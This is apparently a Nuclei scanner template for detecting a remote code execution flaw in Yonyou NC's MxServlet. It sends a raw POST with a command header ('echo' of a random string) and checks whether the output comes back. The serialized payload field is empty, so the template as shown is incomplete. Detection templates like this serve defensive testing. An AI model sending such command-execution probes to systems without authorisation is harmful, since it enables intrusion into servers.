id: yonyou-nc-mxservlet-rce
info:
  name: Yonyou NC MxServlet API Remote Code Execution
  author: ProjectDiscoveryAI
  description: |
    Yonyou NC Cloud is vulnerable to a deserialization remote code execution vulnerability. Attackers can exploit this to execute arbitrary commands on the server, write backdoors, and gain full control over the web server.
  severity: critical
  tags: rce, deserialization
  reference:
    - http://www.yonyougz.com/yonyou/yonyou-nc/

variables:
  random_hex: '{{rand_text_alphanumeric(15)}}'

http:
  - raw:
      - |
        POST /servlet/~ic/nc.bs.framework.mx.MxServlet HTTP/1.1
        Host: {{Hostname}}
        cmd: echo {{random_hex}}
        Content-Type: application/octet-stream

        {{hex_decode("")}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{random_hex}}"
